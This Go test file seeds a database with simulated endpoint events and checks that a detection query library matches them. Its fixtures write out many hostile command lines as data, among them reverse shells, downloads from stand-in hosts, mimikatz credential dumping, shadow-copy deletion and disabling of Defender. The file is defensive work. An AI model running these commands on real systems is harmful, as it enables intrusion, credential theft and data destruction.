package store

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"testing"
	"time"

	_ "github.com/lib/pq"
)

// Every query in the Events page's query library must find the kind of event it is named after, as the
// agents actually emit it. The fixtures below are shaped like the agents' output: field placement, value
// formats, OS names and sources follow agents/*/internal/collector (Windows Sysmon events are typed
// process/network/file/registry with source Sysmon; DNS query names are in dst_ip; macOS collectors report
// "darwin" or "macos"; Linux journald and auditd put their classification in raw.action).
//
// Needs a PostgreSQL DSN in OW_TEST_PG_DSN (or OW_TEST_PG); the test works in a scratch schema it drops.

type fx map[string]interface{}

func win(proc, image, cmd string, sev int) fx {
	return fx{"os": "windows", "event_type": "process", "source": "Sysmon", "event_id": 1, "process_name": proc,
		"image_path": image, "command_line": cmd, "user_name": `CORP\alice`, "severity": sev, "channel": "Microsoft-Windows-Sysmon/Operational"}
}
func lin(proc, image, cmd, user string, sev int) fx {
	return fx{"os": "linux", "event_type": "process", "source": "ebpf", "process_name": proc, "image_path": image,
		"command_line": cmd, "user_name": user, "severity": sev, "pid": 4242}
}
func mac(proc, image, cmd string, sev int) fx {
	return fx{"os": "darwin", "event_type": "process", "source": "eslogger", "process_name": proc, "image_path": image,
		"command_line": cmd, "user_name": "alice", "severity": sev}
}
func file(os, path, source string, sev int, raw fx) fx {
	return fx{"os": os, "event_type": "file", "source": source, "file_path": path, "severity": sev, "raw": raw}
}
func winFile(path string) fx {
	f := file("windows", path, "Sysmon", 2, nil)
	f["event_id"], f["process_name"] = 11, "explorer.exe"
	return f
}
func reg(key string, sev int) fx {
	return fx{"os": "windows", "event_type": "registry", "source": "Sysmon", "event_id": 13, "reg_key": key, "severity": sev}
}
func netw(os string, dport int, proc string) fx {
	return fx{"os": os, "event_type": "network", "source": "Sysmon", "event_id": 3, "src_ip": "10.0.0.5", "dst_ip": "10.0.0.9",
		"src_port": 50123, "dst_port": dport, "proto": "tcp", "process_name": proc, "severity": 1}
}
func dns(os, name string, sev int) fx {
	return fx{"os": os, "event_type": "dns", "source": "proc-dns", "dst_ip": name, "dst_port": 53, "proto": "udp", "process_name": "curl", "severity": sev}
}
func logon(os string, eventID int, user string, sev int) fx {
	return fx{"os": os, "event_type": "logon", "source": "Microsoft-Windows-Security-Auditing", "channel": "Security", "event_id": eventID,
		"user_name": user, "severity": sev}
}
func journald(typ, action, user, msg string, sev int) fx {
	return fx{"os": "linux", "event_type": typ, "source": "journald", "user_name": user, "severity": sev,
		"raw": fx{"action": action, "message": msg, "syslog_identifier": "sshd"}}
}
func typed(t string, sev int) fx { return fx{"os": "", "event_type": t, "source": "connector", "severity": sev} }

func libraryFixtures() []fx {
	F := []fx{
		// Windows processes (Sysmon 1)
		win("powershell.exe", `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell.exe -NoP -W Hidden -enc SQBFAFgA`, 4),
		win("powershell.exe", `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -c (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')`, 3),
		win("mshta.exe", `C:\Windows\System32\mshta.exe`, `mshta.exe http://198.51.100.7/a.hta`, 3),
		win("wscript.exe", `C:\Windows\System32\wscript.exe`, `wscript.exe C:\Users\alice\Downloads\invoice.js`, 3),
		win("rundll32.exe", `C:\Windows\System32\rundll32.exe`, `rundll32.exe C:\Users\alice\AppData\Local\x.dll,Start`, 2),
		win("regsvr32.exe", `C:\Windows\System32\regsvr32.exe`, `regsvr32 /s /n /u /i:http://198.51.100.7/a.sct scrobj.dll`, 3),
		win("WMIC.exe", `C:\Windows\System32\wbem\WMIC.exe`, `wmic process call create "cmd.exe /c calc"`, 3),
		win("schtasks.exe", `C:\Windows\System32\schtasks.exe`, `schtasks /create /tn Updater /tr C:\ProgramData\u.exe /sc onlogon`, 3),
		win("sc.exe", `C:\Windows\System32\sc.exe`, `sc.exe create evilsvc binPath= C:\ProgramData\s.exe`, 3),
		win("fodhelper.exe", `C:\Windows\System32\fodhelper.exe`, `fodhelper.exe`, 3),
		win("powershell.exe", `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`, 4),
		win("wevtutil.exe", `C:\Windows\System32\wevtutil.exe`, `wevtutil.exe cl Security`, 4),
		win("powershell.exe", `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell Set-MpPreference -DisableRealtimeMonitoring $true`, 4),
		win("procdump64.exe", `C:\Tools\procdump64.exe`, `procdump64.exe -accepteula -ma lsass.exe C:\Temp\l.dmp`, 4),
		win("mimikatz.exe", `C:\Users\alice\mimikatz.exe`, `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit`, 5),
		win("ntdsutil.exe", `C:\Windows\System32\ntdsutil.exe`, `ntdsutil "ac i ntds" "ifm" "create full C:\Temp\x" q q`, 4),
		win("reg.exe", `C:\Windows\System32\reg.exe`, `reg.exe save HKLM\SAM C:\Temp\sam.save`, 4),
		win("PsExec.exe", `C:\Tools\PsExec.exe`, `PsExec.exe \\fileserver -s cmd.exe`, 3),
		win("PSEXESVC.exe", `C:\Windows\PSEXESVC.exe`, `C:\Windows\PSEXESVC.exe`, 3),
		win("vssadmin.exe", `C:\Windows\System32\vssadmin.exe`, `vssadmin.exe delete shadows /all /quiet`, 5),
		win("whoami.exe", `C:\Windows\System32\whoami.exe`, `whoami /all`, 2),
		win("tasklist.exe", `C:\Windows\System32\tasklist.exe`, `tasklist /v`, 1),
		win("cmd.exe", `C:\Windows\System32\cmd.exe`, `cmd.exe /c echo hi`, 1),
		win("certutil.exe", `C:\Windows\System32\certutil.exe`, `certutil.exe -urlcache -split -f http://198.51.100.7/x.exe`, 4),
		win("bitsadmin.exe", `C:\Windows\System32\bitsadmin.exe`, `bitsadmin /transfer j http://198.51.100.7/x C:\x`, 3),
		win("net.exe", `C:\Windows\System32\net.exe`, `net.exe user backdoor P@ss /add`, 4),
		win("bcdedit.exe", `C:\Windows\System32\bcdedit.exe`, `bcdedit /set {default} recoveryenabled No`, 4),
		win("mysql.exe", `C:\Program Files\MySQL\bin\mysql.exe`, `mysql.exe -u root --password=hunter2`, 2),
		// Windows Sysmon 10 (process access) and 7 (image load)
		{"os": "windows", "event_type": "process", "source": "Sysmon", "event_id": 10, "process_name": "rundll32.exe", "severity": 4,
			"raw": fx{"TargetImage": `C:\Windows\system32\lsass.exe`, "GrantedAccess": "0x1010"}},
		{"os": "windows", "event_type": "process", "source": "Sysmon", "event_id": 7, "process_name": "rundll32.exe", "image_path": `C:\Windows\System32\comsvcs.dll`, "severity": 1},
		{"os": "windows", "event_type": "dns", "source": "Sysmon", "event_id": 22, "process_name": "chrome.exe", "dst_ip": "example.org", "severity": 1},
		// Windows event log
		logon("windows", 4625, "alice", 4), logon("windows", 4624, "administrator", 1), logon("windows", 4648, "svc_backup", 3),
		logon("windows", 4624, "Guest", 2),
		{"os": "windows", "event_type": "raw", "source": "Microsoft-Windows-Eventlog", "channel": "Security", "event_id": 1102, "severity": 5},
		{"os": "windows", "event_type": "raw", "source": "Service Control Manager", "channel": "System", "event_id": 7045, "severity": 4},
		{"os": "windows", "event_type": "raw", "source": "Microsoft-Windows-Security-Auditing", "channel": "Security", "event_id": 4698, "severity": 4},
		{"os": "windows", "event_type": "raw", "source": "Microsoft-Windows-Security-Auditing", "channel": "Security", "event_id": 4720, "user_name": "administrator", "severity": 4},
		{"os": "windows", "event_type": "raw", "source": "Microsoft-Windows-AppLocker", "channel": "Microsoft-Windows-AppLocker/EXE and DLL", "event_id": 8004, "severity": 3},
		{"os": "windows", "event_type": "raw", "source": "PowerShell", "channel": "Microsoft-Windows-PowerShell/Operational", "event_id": 4104, "severity": 2},
		{"os": "windows", "event_type": "process", "source": "Sysmon", "event_id": 1, "process_name": "svchost.exe", "user_name": `NT AUTHORITY\SYSTEM`, "severity": 1},
		{"os": "windows", "event_type": "network", "source": "Sysmon", "event_id": 3, "process_name": "svchost.exe", "user_name": `NT AUTHORITY\NETWORK SERVICE`, "dst_ip": "10.0.0.1", "dst_port": 135, "proto": "tcp", "severity": 1},
		// Windows files (Sysmon 11) and registry (Sysmon 12/13)
		winFile(`C:\Users\alice\AppData\Local\Temp\x.exe`), winFile(`C:\Users\alice\Desktop\report.docx.locked`),
		winFile(`C:\Users\alice\Downloads\run.ps1`), winFile(`C:\Users\alice\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\u.lnk`),
		winFile(`C:\Windows\System32\evil.dll`),
		reg(`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater`, 4), reg(`HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\x`, 3),
		reg(`HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware`, 4), reg(`HKLM\SYSTEM\CurrentControlSet\Services\evilsvc\ImagePath`, 3),
		reg(`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL`, 4), reg(`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell`, 4),
		reg(`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs`, 4),
		reg(`HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\x`, 2), reg(`HKLM\SAM\SAM\Domains\Account`, 4),
		// Network
		netw("windows", 445, "System"), netw("windows", 3389, "mstsc.exe"), netw("linux", 22, "ssh"), netw("linux", 21, "ftp"),
		netw("linux", 80, "curl"), netw("linux", 443, "curl"), netw("linux", 53, "systemd-resolved"), netw("linux", 587, "postfix"),
		netw("windows", 5985, "powershell.exe"), netw("windows", 389, "lsass.exe"), netw("windows", 88, "lsass.exe"), netw("windows", 1433, "app.exe"),
		{"os": "linux", "event_type": "network", "source": "proc-net", "dst_ip": "169.254.169.254", "dst_port": 80, "proto": "tcp", "process_name": "python3", "severity": 3},
		{"os": "linux", "event_type": "network", "source": "proc-net", "dst_ip": "203.0.113.66", "dst_port": 4444, "proto": "tcp", "process_name": "bash", "severity": 4},
		// DNS (query names in dst_ip, as every agent stores them)
		dns("windows", "rs-ny.rustdesk.com", 3), dns("windows", "wpad.corp.local", 2), dns("windows", "api.urban-vpn.com", 3),
		dns("linux", "abc.ngrok-free.app", 3), dns("linux", "pastebin.com", 3), dns("linux", "facebookcorewwwi.onion", 4),
		dns("darwin", "relay.anydesk.com", 3), dns("macos", "router.teamviewer.com", 3),
		// Linux processes
		lin("bash", "/usr/bin/bash", "bash -i >& /dev/tcp/203.0.113.66/4444 0>&1", "www-data", 5),
		lin("python3", "/usr/bin/python3.11", `python3 -c import pty;pty.spawn("/bin/bash")`, "www-data", 4),
		lin("perl", "/usr/bin/perl", `perl -e use Socket;`, "www-data", 4),
		lin("curl", "/usr/bin/curl", "curl -s -o /tmp/x http://198.51.100.7/x", "www-data", 3),
		lin("wget", "/usr/bin/wget", "wget -q http://198.51.100.7/m -O /dev/shm/m", "www-data", 3),
		lin("crontab", "/usr/bin/crontab", "crontab -e", "alice", 2),
		lin("systemctl", "/usr/bin/systemctl", "systemctl enable evil.service", "root", 3),
		lin("chmod", "/usr/bin/chmod", "chmod u+s /tmp/rootbash", "root", 4),
		lin("chmod", "/usr/bin/chmod", "chmod +x /tmp/payload", "www-data", 2),
		lin("insmod", "/usr/sbin/insmod", "insmod /tmp/rk.ko", "root", 5),
		lin("nmap", "/usr/bin/nmap", "nmap -sS 10.0.0.0/24", "alice", 3),
		lin("dig", "/usr/bin/dig", "dig axfr @ns1.example.com example.com", "alice", 3),
		lin("nc", "/usr/bin/nc.openbsd", "nc -e /bin/sh 203.0.113.66 4444", "www-data", 5),
		lin("socat", "/usr/bin/socat", "socat TCP:203.0.113.66:4444 EXEC:/bin/sh", "www-data", 4),
		lin("miner", "/tmp/.x/miner", "/tmp/.x/miner -o pool", "www-data", 4),
		lin("kworker", "/dev/shm/kworker", "/dev/shm/kworker", "www-data", 4),
		lin("env", "/usr/bin/env", "env LD_PRELOAD=/tmp/x.so /usr/bin/id", "www-data", 4),
		lin("strace", "/usr/bin/strace", "strace -p 812", "root", 3),
		lin("sudo", "/usr/bin/sudo", "sudo -i", "alice", 2),
		lin("useradd", "/usr/sbin/useradd", "useradd -m backdoor", "root", 4),
		lin("sshd", "/usr/sbin/sshd", "/usr/sbin/sshd -D", "root", 1),
		// Linux files (inotify/fanotify; raw.action create/modify/delete)
		file("linux", "/root/.ssh/authorized_keys", "inotify", 4, fx{"action": "modify"}),
		file("linux", "/etc/shadow", "inotify", 4, fx{"action": "modify"}),
		file("linux", "/etc/passwd", "inotify", 3, fx{"action": "modify"}),
		file("linux", "/etc/sudoers", "inotify", 4, fx{"action": "modify"}),
		file("linux", "/etc/ssh/sshd_config", "inotify", 3, fx{"action": "modify"}),
		file("linux", "/var/spool/cron/crontabs/root", "inotify", 3, fx{"action": "create"}),
		file("linux", "/tmp/payload", "inotify", 2, fx{"action": "create"}),
		file("linux", "/dev/shm/m", "inotify", 3, fx{"action": "create"}),
		file("linux", "/etc/ld.so.preload", "inotify", 5, fx{"action": "create"}),
		file("linux", "/etc/systemd/system/evil.service", "inotify", 3, fx{"action": "create"}),
		file("linux", "/usr/bin/ls", "fanotify", 4, fx{"action": "modify"}),
		file("linux", "/home/alice/.bashrc", "inotify", 2, fx{"action": "modify"}),
		file("linux", "/root/.bash_history", "inotify", 3, fx{"action": "delete"}),
		// Linux journald and auditd
		journald("logon", "sudo_exec", "alice", "alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash", 3),
		journald("logon", "sudo_failure", "alice", "pam_unix(sudo:auth): authentication failure", 4),
		journald("logon", "ssh_login_failure", "root", "Failed password for root from 203.0.113.9 port 4022 ssh2", 3),
		journald("logon", "ssh_invalid_user", "admin", "Invalid user admin from 203.0.113.9", 3),
		journald("logon", "ssh_login_success", "alice", "Accepted publickey for alice from 10.0.0.2", 1),
		journald("logon", "su_success", "root", "pam_unix(su:session): session opened for user root", 2),
		journald("logon", "pam_auth_failure", "bob", "pam_unix(login:auth): authentication failure", 3),
		journald("logon", "useradd_exec", "", "new user: name=backdoor", 4),
		journald("raw", "kernel_oom", "", "Out of memory: Killed process 812 (java)", 3),
		journald("raw", "kernel_segfault", "", "app[812]: segfault at 0", 2),
		journald("raw", "cron_exec", "root", "(root) CMD (/usr/local/bin/backup)", 1),
		journald("process", "systemd_unit_change", "", "Started evil.service.", 1),
		{"os": "linux", "event_type": "raw", "source": "auditd", "severity": 4, "raw": fx{"action": "kernel_module_load", "message": "type=KERN_MODULE name=rk"}},
		{"os": "linux", "event_type": "health", "source": "agent", "severity": 1},
		// macOS (collectors say darwin, the normaliser and health say macos)
		file("darwin", "/Library/LaunchDaemons/com.evil.plist", "fsevents", 4, nil),
		file("darwin", "/Users/alice/Library/LaunchAgents/com.evil.plist", "fsevents", 4, nil),
		file("darwin", "/Users/alice/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm", "fsevents", 3, nil),
		file("macos", "/Users/alice/Library/Application Support/com.apple.TCC/TCC.db", "fsevents", 4, nil),
		mac("spctl", "/usr/sbin/spctl", "spctl --master-disable", 4),
		mac("xattr", "/usr/bin/xattr", "xattr -d com.apple.quarantine /tmp/app", 3),
		mac("csrutil", "/usr/bin/csrutil", "csrutil disable", 5),
		mac("security", "/usr/bin/security", "security dump-keychain -d login.keychain", 4),
		mac("osascript", "/usr/bin/osascript", `osascript -e display dialog`, 3),
		mac("curl", "/usr/bin/curl", "curl -fsSL https://198.51.100.7/i.sh", 2),
		mac("python3", "/usr/bin/python3", `python3 -c import os`, 3),
		// Code, cloud and application events
		typed("devops.push", 1), typed("devops.secret_push", 5), typed("devops.cicd_modified", 4), typed("devops.sensitive_file", 4),
		typed("devops.repo_publicized", 5), typed("devops.repo_deleted", 5), typed("devops.org_member_added", 3), typed("devops.dependency_change", 2),
		typed("devops.mass_deletion", 5), typed("devops.workflow_run", 1), typed("devops.audit", 1),
		typed("cloud.cloudtrail", 1), typed("cloud.guardduty", 4), typed("cloud.securityhub", 3), typed("cloud.azure_activity", 1),
		typed("cloud.azure_defender", 4), typed("cloud.entra_signin", 2), typed("cloud.entra_audit", 2), typed("cloud.gcp_audit", 1),
		typed("cloud.gcp_gke_audit", 2), typed("cloud.gcp_policy_denied", 3), typed("cloud.gcp_scc", 4), typed("cloud.cspm", 3), typed("cloud.aws_anomaly", 4),
		typed("app.security", 4), typed("app.alert", 4), typed("applog", 1), typed("app.service_change", 1),
	}
	// Filler that no library query should mistake for an attack: ordinary processes, files and traffic.
	for i := 0; i < 40; i++ {
		F = append(F,
			lin("postgres", "/usr/lib/postgresql/16/bin/postgres", fmt.Sprintf("postgres: checkpointer %d", i), "postgres", 1),
			win("chrome.exe", `C:\Program Files\Google\Chrome\Application\chrome.exe`, fmt.Sprintf(`chrome.exe --type=renderer --id=%d`, i), 1),
			file("linux", fmt.Sprintf("/var/lib/app/data/%d.dat", i), "inotify", 1, fx{"action": "modify"}),
		)
	}
	return F
}

type libEntry struct {
	Group, Label, Q string
}

func loadLibrary(t *testing.T) []libEntry {
	b, err := os.ReadFile("../../../frontend/src/pages/events/query-library.json")
	if err != nil {
		t.Skip("frontend not present:", err)
	}
	var out []libEntry
	if err := json.Unmarshal(b, &out); err != nil {
		t.Fatal(err)
	}
	return out
}

// broad queries are allowed to match much of the fixture set
func broadQuery(l libEntry) bool {
	q := strings.ToLower(l.Q)
	switch l.Label {
	case "Processes run as root", "TCP connections", "Files dropped in /tmp", "/etc changes":
		return true
	}
	return strings.HasPrefix(l.Label, "All ") || strings.Contains(q, "sev>=") || l.Group == "Sysmon"
}

func TestQueryLibraryMatchesAgentEvents(t *testing.T) {
	dsn := os.Getenv("OW_TEST_PG_DSN")
	if dsn == "" {
		dsn = os.Getenv("OW_TEST_PG")
	}
	if dsn == "" {
		t.Skip("OW_TEST_PG_DSN not set")
	}
	lib := loadLibrary(t)
	db, err := sql.Open("postgres", dsn)
	if err != nil {
		t.Fatal(err)
	}
	defer db.Close()
	db.SetMaxOpenConns(1) // one connection, so search_path sticks
	schema := fmt.Sprintf("owlib_%d", rand.Int63())
	if _, err := db.Exec(`CREATE SCHEMA ` + schema); err != nil {
		t.Fatal(err)
	}
	defer db.Exec(`DROP SCHEMA ` + schema + ` CASCADE`)
	if _, err := db.Exec(`SET search_path TO ` + schema); err != nil {
		t.Fatal(err)
	}
	if _, err := db.Exec(`CREATE TABLE events (id text, time timestamptz, host text, os text, event_type text, severity int, source text, raw jsonb,
		pid int, ppid int, process_name text, command_line text, image_path text, user_name text, domain text, logon_id text,
		src_ip text, src_port int, dst_ip text, dst_port int, proto text, reg_key text, reg_value text, file_path text, file_hash text,
		event_id int, channel text, process_guid text)`); err != nil {
		t.Fatal(err)
	}
	cols := []string{"os", "event_type", "severity", "source", "pid", "process_name", "command_line", "image_path", "user_name",
		"src_ip", "src_port", "dst_ip", "dst_port", "proto", "reg_key", "file_path", "event_id", "channel"}
	fixtures := libraryFixtures()
	for i, f := range fixtures {
		vals := []interface{}{fmt.Sprint(i), time.Now(), "host" + fmt.Sprint(i%7)}
		ph := []string{"$1", "$2", "$3"}
		for j, c := range cols {
			vals = append(vals, f[c])
			ph = append(ph, fmt.Sprintf("$%d", j+4))
		}
		raw, _ := json.Marshal(f["raw"])
		if f["raw"] == nil {
			raw = []byte(`{}`)
		}
		vals = append(vals, string(raw))
		ph = append(ph, fmt.Sprintf("$%d", len(cols)+4))
		if _, err := db.Exec(`INSERT INTO events (id, time, host, `+strings.Join(cols, ",")+`, raw) VALUES (`+strings.Join(ph, ",")+`)`, vals...); err != nil {
			t.Fatalf("fixture %d: %v", i, err)
		}
	}
	limit := len(fixtures) * 12 / 100
	for _, l := range lib {
		e, err := ParseEventQuery(l.Q)
		if err != nil {
			t.Errorf("%s / %s: %q does not parse: %v", l.Group, l.Label, l.Q, err)
			continue
		}
		clause, args, err := e.SQL(1)
		if err != nil {
			t.Errorf("%s / %s: %q does not compile: %v", l.Group, l.Label, l.Q, err)
			continue
		}
		var n int
		if err := db.QueryRow(`SELECT count(*) FROM events WHERE `+clause, args...).Scan(&n); err != nil {
			t.Errorf("%s / %s: %q: SQL error: %v", l.Group, l.Label, l.Q, err)
			continue
		}
		if n == 0 {
			t.Errorf("%s / %s: %q matches none of the agent-shaped events", l.Group, l.Label, l.Q)
		} else if n > limit && !broadQuery(l) {
			t.Errorf("%s / %s: %q matches %d of %d events; too broad for its name", l.Group, l.Label, l.Q, n, len(fixtures))
		}
	}
}
